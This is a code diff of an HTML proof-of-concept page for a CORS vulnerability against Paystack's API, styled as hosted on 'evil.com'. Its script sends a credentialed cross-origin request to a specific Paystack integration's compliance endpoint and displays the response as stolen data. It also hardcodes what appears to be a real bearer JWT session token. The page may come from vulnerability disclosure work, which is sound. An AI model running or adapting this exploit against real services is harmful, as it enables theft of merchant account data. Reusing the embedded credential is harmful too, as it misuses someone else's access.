@@ -13,36 +13,27 @@
 </head>
 <body>
     <h2>🔴 CORS Vulnerability PoC - Paystack</h2>
-    <p>This page is hosted on <strong>evil.com</strong> and 
-    is stealing your Paystack data!</p>
+    <p>Hosted on <strong>evil.com</strong> stealing Paystack data!</p>
     <button onclick="stealData()">Click to Steal Data</button>
     <br><br>
     <div id="result">Data will appear here...</div>
-
 <script>
 function stealData() {
     document.getElementById("result").innerText = "Fetching...";
-    
-    var token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NjM0ODU2MSwicmVmcmVzaENvdW50Ijo1LCJmaXJzdElzc3VlZEF0IjoxNzc5MzM5MjM5LCJzc29Mb2dpbiI6ZmFsc2UsImp0aSI6IjZhMGVmMWE1OWZkYWEzOWU0ODc2NWNkZCIsImlhdCI6MTc3OTM2NDI2MSwibmJmIjoxNzc5MzY0MjYxLCJleHAiOjE3Nzk0NTA2NjF9.8CNIvqo_wPo6S3Q1aEeQ2UT8f7H2fhAAFB9GkvXcPzE";
-    
     fetch("https://api.paystack.co/integration/1851143/compliance_status", {
         method: "GET",
         credentials: "include",
         headers: {
-            "Authorization": "Bearer " + token,
-            "Content-Type": "application/json"
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NjM0ODU2MSwicmVmcmVzaENvdW50Ijo1LCJmaXJzdElzc3VlZEF0IjoxNzc5MzM5MjM5LCJzc29Mb2dpbiI6ZmFsc2UsImp0aSI6IjZhMGVmMWE1OWZkYWEzOWU0ODc2NWNkZCIsImlhdCI6MTc3OTM2NDI2MSwibmJmIjoxNzc5MzY0MjYxLCJleHAiOjE3Nzk0NTA2NjF9.8CNIvqo_wPo6S3Q1aEeQ2UT8f7H2fhAAFB9GkvXcPzE"
         }
     })
-    .then(function(response) {
-        return response.json();
-    })
-    .then(function(data) {
+    .then(r => r.json())
+    .then(d => {
         document.getElementById("result").innerText = 
-            "✅ DATA STOLEN FROM PAYSTACK!\n\n" + 
-            JSON.stringify(data, null, 2);
+            "✅ DATA STOLEN!\n\n" + JSON.stringify(d, null, 2);
     })
-    .catch(function(error) {
-        document.getElementById("result").innerText = "Error: " + error;
+    .catch(e => {
+        document.getElementById("result").innerText = "Error: " + e;
     });
 }
 </script>
